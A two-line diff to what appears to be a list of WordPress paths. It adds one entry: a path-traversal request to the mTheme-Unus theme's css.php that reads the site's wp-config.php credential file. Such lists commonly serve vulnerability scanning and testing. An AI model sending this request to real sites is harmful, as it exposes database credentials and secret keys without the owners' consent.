@@ -1,1 +1,2 @@
 /wp-content/themes/mTheme-Unus/style.css
+/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php
